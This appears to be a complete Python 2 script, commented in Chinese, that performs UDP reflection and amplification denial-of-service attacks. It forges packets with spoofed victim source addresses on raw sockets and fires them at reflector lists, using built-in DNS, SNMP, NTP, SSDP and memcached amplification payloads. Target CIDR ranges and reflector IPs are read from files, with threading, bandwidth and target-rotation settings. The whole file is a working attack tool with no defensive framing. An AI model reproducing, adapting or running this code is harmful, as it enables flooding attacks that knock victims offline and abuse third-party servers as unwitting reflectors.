#coding=utf-8
#!/usr/bin/python
import sys
import time
import socket
import thread
import threading
import multiprocessing
import IPy
from random import randint
from optparse import OptionParser
from pinject import IP, UDP

thread_sum = 200 #线程数量(线程数据根据反射ip数量与当前cpu进行调度)
switch_time = 0 #切换ip攻击列表间隔时间（单位/s）|值为0则不切换ip段（@target_dir文件第一个ip为永久攻击对象）
target_dir = 'ip.txt'#攻击ip,CIDR格式
soldier_dir = 'new.txt'#反射ip
ddos_type = 'ssdp'#攻击类型
soldier_size = 50 #反射ip给予带宽大小,(单位/kbps)
PAYLOAD = {
	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
			'\x00\x00\x00\x00\x00\x00'),
	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
		'\x01\x02\x01\x05\x00'),
	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'),
	'memcache':('\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n')
}
PORT = {
	'dns': 53,
	'ntp': 123,
	'snmp': 161,
	'ssdp': 1900,
	'memcache':11211}
def attack(soldier,target):
	
	proto = ddos_type
	payload = PAYLOAD[proto]
	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
	udp = UDP(randint(1, 65535), PORT[proto], payload).pack(target, soldier)
	ip = IP(target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
	data_pack,length,size = [ip+udp+payload,len(ip+udp+payload),(soldier_size*1024)/8]
	i = 0
	while True:
		sock.sendto(data_pack, (soldier, PORT[proto]))
		i = i+length
		if i>=size:
			time.sleep(1)
			i = 0

	
def ddos_1(soldier):

	soldier_all = soldier
	for line in soldier_all:
		t = threading.Thread(target=attack, args=(line['soldier'],line['target'],))
		t.setDaemon(True)
		t.start()
		
	while 1:
		pass
		

def ddos_sub():
	target_all = open(target_dir,'r')
	for line in target_all:
		getip = GetIp(line)
		p = multiprocessing.Pool(processes=len(getip.att_data))
		for x in getip.att_data:
			p.apply_async(ddos_1, args=(x,))
		if switch_time != 0:
			time.sleep(switch_time)
		else:
			while True:
				pass
	p.terminate()
	ddos_sub()

	
#IP调度类
#Getip start-------------------------
class GetIp(object):
	global soldier_dir
	global thread_sum
	
	def __init__(self,target):
		self.target_ip = ''
		self.target = {'data':[]}
		self.soldier = {'data':[],'count':0}
		self.re = {}
		self.att_data = {}
		self.target_ip = target
		self.get_soldier()
		self.get_target()
		self.average_ip()
		self.attack_data()

	#获取所有反射ip
	def get_soldier(self):
		soldier_all = open(soldier_dir,'r')
		for ip in soldier_all:
			self.soldier['data'].append(ip)
		self.soldier['count'] = len(self.soldier['data'])

	#获取所有攻击ip
	def get_target(self):
		ip = IPy.IP(self.target_ip)
		for x in ip:
			self.target['data'].append(str(x))

	#对ip数据进行调度
	def average_ip(self):
		for x in self.target['data']:
			if self.soldier['data']:
				if self.re.has_key(x) == False:
					self.re[x] = {'data':[]}
				self.re[x]['data'].append(self.soldier['data'][0])
				del self.soldier['data'][0]
		if self.soldier['data']:
			self.average_ip()
		else:
			return True

	#整理攻击ip数据
	def attack_data(self):
		att_data = [[]]
		listID = 0
		for x in self.re:
			for x2 in self.re[x]:
				for x3 in self.re[x][x2]:
					att_data[listID].append({'soldier':x3,'target':x})
					if len(att_data[listID])%thread_sum == 0:
						listID+=1
						att_data.append([])
		self.att_data = att_data
			






if __name__ == '__main__':

	ddos_sub()

	while 1:
		pass
